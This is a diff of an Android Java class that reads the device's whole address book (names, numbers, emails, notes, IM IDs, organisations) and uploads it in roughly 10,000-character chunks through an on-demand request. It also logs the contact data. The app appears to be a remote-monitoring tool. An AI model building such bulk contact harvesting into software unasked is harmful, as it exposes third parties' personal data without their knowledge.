@@ -2,24 +2,26 @@ package com.inet.android.contacts;
 
 import java.util.ArrayList;
 
-import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.ContentResolver;
 import android.content.Context;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
 import android.database.Cursor;
 import android.os.AsyncTask;
+import android.preference.PreferenceManager;
 import android.provider.ContactsContract;
 
-import com.inet.android.request.DataRequest;
 import com.inet.android.request.OnDemandRequest;
 import com.inet.android.utils.Logging;
 
 public class GetContacts extends AsyncTask<Context, Void, Void> {
 	Context mContext;
-	private int type = 6;
-
+	private String iType = "6";
+	Editor ed;
+	SharedPreferences sp;
 	ArrayList<String> email = null;
 	ArrayList<String> emailType = null;
 	ArrayList<CharSequence> CustomemailType = null;
@@ -32,17 +34,12 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 	private JSONObject jsonImId;
 	private JSONObject jsonImCount;
 	private JSONObject jsonOrganization;
-	private JSONObject jsonObject;
-	private JSONArray data = new JSONArray();
-	private JSONObject jsonAllContact;
+	private JSONObject jsonContact;
 	private String LOG_TAG = "GetContacts";
-	private String sendJSONStr;
+	private String complete;
 
 	public void readContacts() throws JSONException {
-		data = new JSONArray();
-		jsonAllContact = new JSONObject();
-		jsonObject = new JSONObject();
-
+		String sendStr = null;
 		ContentResolver cr = mContext.getContentResolver();
 		Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null,
 				null, null, null);
@@ -50,6 +47,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 		if (cur.getCount() > 0) {
 			while (cur.moveToNext()) {
 
+				jsonContact = new JSONObject();
 				jsonInfo = new JSONObject();
 				jsonName = new JSONObject();
 				jsonPhoneType = new JSONObject();
@@ -59,7 +57,7 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 				jsonImId = new JSONObject();
 				jsonImCount = new JSONObject();
 				jsonOrganization = new JSONObject();
-				
+
 				email = new ArrayList<String>();
 				emailType = new ArrayList<String>();
 
@@ -193,34 +191,51 @@ public class GetContacts extends AsyncTask<Context, Void, Void> {
 					orgCur.close();
 
 				}
-//				JSONObject object = new JSONObject();
+				// JSONObject object = new JSONObject();
 
 				if (!jsonName.isNull("name"))
-					jsonInfo.put("name", jsonName);
-				jsonInfo.put("number", jsonPhoneType);
+					jsonContact.put("name", jsonName);
+				jsonContact.put("number", jsonPhoneType);
 				if (!jsonInfo.isNull("email"))
 					jsonInfo.put("email", jsonEmailId);
 				jsonInfo.put("note", jsonNote);
 				jsonInfo.put("im", jsonImId);
 				jsonInfo.put("org", jsonOrganization);
-				jsonObject.put("info", jsonInfo);
+				jsonContact.put("info", jsonInfo);
 				Logging.doLog(LOG_TAG, jsonPhoneType.toString(),
 						jsonPhoneType.toString());
+				if (sendStr == null)
+					sendStr = jsonContact.toString();
+				else
+					sendStr += "," + jsonContact.toString();
+				if (sendStr.length() >= 10000) {
+					Logging.doLog(LOG_TAG, "str >= 10000 ..", "str >= 10000 ..");
+					complete = "0";
+					sendRequest(sendStr, complete);
+					sendStr = null;
+				}
 			}
-			cur.close();
-			if (sendJSONStr != null) {
-//				Logging.doLog(LOG_TAG, sendJSONStr,
-//						sendJSONStr);
-				sendJSONStr = jsonObject.toString();
-				
-				OnDemandRequest dr = new OnDemandRequest(mContext, type);
-				dr.sendRequest(sendJSONStr);
-				
-			}
+			complete = "1";
+			Logging.doLog(LOG_TAG, "Send complete 1 ..", "Send complete 1 ..");
+			sendRequest(sendStr, complete);
+			sendStr = null;
+
 		}
-		
+		sp = PreferenceManager.getDefaultSharedPreferences(mContext);
+		ed = sp.edit();
+		ed.putString("statusContacts", "0");
+		ed.commit();
+		cur.close();
+
 	}
 
+	private void sendRequest(String str, String complete) {
+		if (str != null) {
+			OnDemandRequest dr = new OnDemandRequest(mContext, iType, complete);
+			dr.sendRequest(str);
+			Logging.doLog(LOG_TAG, str, str);
+		}
+	}
 
 	private String getTipe(int phonetype) {
 		String sType = "";
